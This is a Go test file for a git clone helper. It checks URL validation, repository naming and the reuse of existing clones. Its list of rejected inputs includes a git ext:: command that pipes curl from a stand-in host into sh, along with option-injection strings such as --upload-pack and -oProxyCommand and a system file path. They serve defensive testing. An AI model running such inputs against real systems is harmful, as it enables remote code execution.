package worktree

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func TestValidateCloneURLAcceptsOnlyFetchTransports(t *testing.T) {
	good := []string{
		"https://github.com/acme/widget",
		"https://github.com/acme/widget.git",
		"ssh://git@github.com/acme/widget.git",
		"git@github.com:acme/widget.git",
	}
	for _, u := range good {
		if err := ValidateCloneURL(u); err != nil {
			t.Errorf("ValidateCloneURL(%q) = %v, want nil", u, err)
		}
	}

	// Each of these is a way to make `git clone` do something other than
	// fetch: ext:: runs the command in the URL, file:// reaches anywhere on
	// this disk, and a leading dash is read by git as an option no matter how
	// the argv is built.
	bad := []string{
		"ext::sh -c 'curl evil.test | sh'",
		"file:///etc",
		"/etc/passwd",
		"--upload-pack=touch /tmp/pwned",
		"-oProxyCommand=id",
		"http://insecure.test/repo.git",
		"git://anonymous.test/repo.git",
		"https://example.test/repo .git",
		"https://example.test/repo\nid",
		"",
		"   ",
	}
	for _, u := range bad {
		if err := ValidateCloneURL(u); err == nil {
			t.Errorf("ValidateCloneURL(%q) = nil, want an error", u)
		}
	}
}

func TestCloneNameStripsTheDecoration(t *testing.T) {
	cases := map[string]string{
		"https://github.com/acme/widget.git":    "widget",
		"https://github.com/acme/widget":        "widget",
		"https://github.com/acme/widget/":       "widget",
		"git@github.com:acme/Rack_Metrics.git":  "rack-metrics",
		"ssh://git@host.test/~/deep/path/x.git": "x",
	}
	for url, want := range cases {
		if got := CloneName(url); got != want {
			t.Errorf("CloneName(%q) = %q, want %q", url, got, want)
		}
	}
}

// bareOrigin creates a bare repository with one commit, reachable over a
// filesystem path. Clone refuses file:// URLs, so the test drives the git
// plumbing directly rather than through Clone's own allowlist.
func bareOrigin(t *testing.T) string {
	t.Helper()
	base := t.TempDir()
	bare := filepath.Join(base, "origin.git")
	work := filepath.Join(base, "work")

	runGit(t, base, "init", "--bare", "--initial-branch=main", bare)
	runGit(t, base, "init", "--initial-branch=main", work)
	runGit(t, work, "config", "user.name", "test")
	runGit(t, work, "config", "user.email", "t@example.com")
	if err := os.WriteFile(filepath.Join(work, "README.md"), []byte("hi\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	runGit(t, work, "add", ".")
	runGit(t, work, "commit", "-m", "initial")
	runGit(t, work, "remote", "add", "origin", bare)
	runGit(t, work, "push", "-u", "origin", "main")
	return bare
}

func runGit(t *testing.T, dir string, args ...string) {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(),
		"GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@example.com",
		"GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@example.com")
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
}

func TestCloneRefusesTheURLBeforeTouchingTheFilesystem(t *testing.T) {
	dest := filepath.Join(t.TempDir(), "widget")
	if _, err := Clone(context.Background(), "ext::sh -c id", dest); err == nil {
		t.Fatal("expected an error")
	}
	if _, err := os.Stat(dest); err == nil {
		t.Error("a refused URL must not have created anything")
	}
}

func TestCloneFetchesAndThenReusesTheSameClone(t *testing.T) {
	origin := bareOrigin(t)
	dest := filepath.Join(t.TempDir(), "widget")

	got, err := cloneInto(context.Background(), origin, dest)
	if err != nil {
		t.Fatalf("cloneInto: %v", err)
	}
	if got != dest {
		t.Errorf("path = %q, want %q", got, dest)
	}
	if _, err := os.Stat(filepath.Join(dest, "README.md")); err != nil {
		t.Errorf("the clone is missing the repository's contents: %v", err)
	}

	// Re-running the wizard against a repository already imported must not
	// re-download it.
	again, err := cloneInto(context.Background(), origin, dest)
	if err != nil {
		t.Fatalf("second cloneInto: %v", err)
	}
	if again != dest {
		t.Errorf("path = %q, want the existing clone reused", again)
	}
}

func TestCloneRefusesADirectoryHoldingSomethingElse(t *testing.T) {
	origin := bareOrigin(t)
	dest := filepath.Join(t.TempDir(), "widget")
	if _, err := cloneInto(context.Background(), origin, dest); err != nil {
		t.Fatal(err)
	}

	// A directory that is a clone of a different remote is somebody's work.
	// Reusing it would analyse the wrong repository; overwriting it would
	// destroy the right one.
	_, err := cloneInto(context.Background(), "https://example.test/other.git", dest)
	if err == nil {
		t.Fatal("expected an error")
	}
	if !strings.Contains(err.Error(), "already a clone of") {
		t.Errorf("error = %v, want it to say what is already there", err)
	}
}

func TestCloneRefusesADirectoryThatIsNotARepository(t *testing.T) {
	dest := filepath.Join(t.TempDir(), "notarepo")
	if err := os.MkdirAll(dest, 0o755); err != nil {
		t.Fatal(err)
	}
	_, err := cloneInto(context.Background(), "https://example.test/widget.git", dest)
	if err == nil {
		t.Fatal("expected an error")
	}
	if !strings.Contains(err.Error(), "not a clone") {
		t.Errorf("error = %v", err)
	}
}
